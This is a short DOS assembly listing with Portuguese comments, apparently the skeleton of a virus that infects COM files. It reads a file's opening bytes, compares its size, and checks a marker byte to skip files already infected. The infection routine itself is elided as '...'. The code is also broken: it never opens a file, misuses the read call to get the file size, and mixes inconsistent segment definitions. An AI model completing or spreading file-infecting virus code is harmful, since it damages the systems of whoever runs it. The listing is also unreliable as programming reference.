	JE READ
	JNE Diego_Analise_do_virus
; Define os segmentos de código, dados e pilha
.code
org 100h

start:
    ; Configura os segmentos de código e dados
    mov ax, seg codigo
    mov ds, ax
    mov es, ax

    ; Chama o procedimento falso_proc
    call falso_proc

    ; Configura o ponteiro da pilha
    mov bp, sp
    sub bp, 107h

    ; Lê os três primeiros bytes do arquivo
    mov ah, 3Fh
    mov cx, 3
    lea dx, [bp+offset buffer]
    int 21h

    ; Obtém o tamanho do arquivo
    mov ah, 3Fh
    mov cx, 0
    mov dx, -1
    int 21h

    ; Calcula o tamanho do arquivo menos o tamanho do vírus e dos três primeiros bytes
    sub ax, virus_size+3

    ; Verifica se o tamanho do arquivo é igual ao tamanho esperado
    cmp ax, word ptr [bp+offset buffer+1]
    jne bomb_out

    ; Lê o quarto byte do arquivo e verifica se já está infectado
    mov ah, 3Fh
    mov cx, 1
    lea dx, [bp+offset buffer+3]
    int 21h
    cmp byte ptr [bp+offset buffer+3], infection_id_byte
    je bomb_out

infect_it:
    ; Insere o código do vírus no arquivo
    ...

    ; Fecha o arquivo
    mov ah, 3Eh
    int 21h

    ; Sai do programa
    mov ah, 4Ch
    int 21h

falso_proc:
    ret

; Define as variáveis e constantes utilizadas
codigo segment
    buffer db 3 dup (0)
    virus_size equ $-start
    infection_id_byte db 0x12
codigo ends
end start
